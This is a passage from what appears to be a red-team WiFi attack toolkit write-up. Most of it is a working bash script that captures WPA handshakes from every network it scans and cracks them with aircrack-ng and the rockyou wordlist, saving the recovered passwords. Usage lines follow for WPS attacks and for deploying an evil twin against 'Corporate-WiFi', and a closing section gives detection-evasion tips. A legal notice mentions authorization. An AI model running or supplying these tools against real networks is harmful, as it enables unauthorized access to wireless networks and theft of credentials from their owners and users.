        # Fallback to aircrack-ng
        timeout 300 aircrack-ng -w "$WORDLIST" -b "${handshake_file%.*}" "${handshake_file%.hc22000}-01.cap" | tee aircrack_output.tmp
        
        if grep -q "KEY FOUND" aircrack_output.tmp; then
            local password
            password=$(grep "KEY FOUND" aircrack_output.tmp | cut -d'[' -f2 | cut -d']' -f1)
            echo -e "${GREEN}[+] Password found: $password${NC}"
            echo "$handshake_file:$password" >> cracked_passwords.txt
        else
            echo -e "${RED}[-] Failed to crack $handshake_file${NC}"
        fi
        
        rm -f aircrack_output.tmp
    done
}

cleanup() {
    echo -e "${YELLOW}[+] Cleaning up...${NC}"
    
    # Kill any remaining processes
    pkill -f airodump-ng > /dev/null 2>&1
    pkill -f aireplay-ng > /dev/null 2>&1
    
    # Remove temporary files
    rm -f networks.tmp
    
    # Disable monitor mode
    airmon-ng stop "$INTERFACE" > /dev/null 2>&1
}

main() {
    print_banner
    
    # Setup cleanup trap
    trap cleanup EXIT
    
    # Check if running as root
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[-] This script must be run as root${NC}"
        exit 1
    fi
    
    check_dependencies
    
    if ! enable_monitor_mode; then
        exit 1
    fi
    
    if ! scan_networks; then
        exit 1
    fi
    
    echo -e "${YELLOW}[+] Starting handshake capture process...${NC}"
    
    local success_count=0
    local total_count=0
    
    while IFS=',' read -r bssid channel power essid; do
        ((total_count++))
        
        if capture_handshake "$bssid" "$channel" "$essid"; then
            ((success_count++))
        fi
        
        # Small delay between targets
        sleep 5
        
    done < networks.tmp
    
    echo -e "${BLUE}[+] Handshake capture complete:${NC}"
    echo -e "    Successful: $success_count/$total_count"
    
    if [[ $success_count -gt 0 ]]; then
        crack_handshakes
        
        if [[ -f cracked_passwords.txt ]]; then
            echo -e "${GREEN}[+] Cracked passwords saved to cracked_passwords.txt${NC}"
        fi
    fi
    
    echo -e "${BLUE}[+] Attack complete${NC}"
}

# Handle command line arguments
case "${1:-}" in
    -h|--help)
        echo "Usage: $0 [OPTIONS]"
        echo "Options:"
        echo "  -i INTERFACE    Wireless interface (default: wlan0mon)"
        echo "  -w WORDLIST     Wordlist file (default: /usr/share/wordlists/rockyou.txt)"
        echo "  -t TIMEOUT      Timeout per target in seconds (default: 300)"
        echo "  -h, --help      Show this help"
        exit 0
        ;;
    -i)
        INTERFACE="$2"
        shift 2
        ;;
    -w)
        WORDLIST="$2"
        shift 2
        ;;
    -t)
        TIMEOUT="$2"
        shift 2
        ;;
esac

main "$@"
```

## Usage Examples

### Basic Reconnaissance
```bash
# Run WiFi reconnaissance
python3 wifi_recon.py -i wlan0mon -d 600 -f json

# Target specific network
python3 wifi_recon.py -i wlan0mon -t AA:BB:CC:DD:EE:FF -c 6
```

### WPS Attacks
```bash
# Attack all WPS networks
python3 wps_attacker.py -i wlan0mon

# Target specific BSSID
python3 wps_attacker.py -i wlan0mon -t AA:BB:CC:DD:EE:FF -c 6
```

### Evil Twin Deployment
```bash
# Deploy evil twin for "Corporate-WiFi"
python3 evil_twin.py -i wlan0 -s "Corporate-WiFi"
```

### Automated Handshake Capture
```bash
# Run automated handshake capture and cracking
chmod +x handshake_automation.sh
./handshake_automation.sh -i wlan0mon -w /path/to/wordlist.txt
```

## Security Considerations

⚠️ **Legal Notice**: These tools are for authorized penetration testing and security research only. Unauthorized access to wireless networks is illegal.

### Best Practices
1. **Authorization**: Ensure proper authorization before testing
2. **Scope**: Clearly define testing scope and boundaries  
3. **Documentation**: Document all activities and findings
4. **Cleanup**: Properly clean up after testing
5. **Reporting**: Provide clear remediation recommendations

### Detection Evasion
- Use random MAC addresses to avoid tracking
- Limit transmission power to reduce detection range
- Implement timing delays between attacks
- Monitor for defensive responses

---

*These tools are part of the mitm.life red team WiFi methodology and should be used responsibly for defensive security testing.*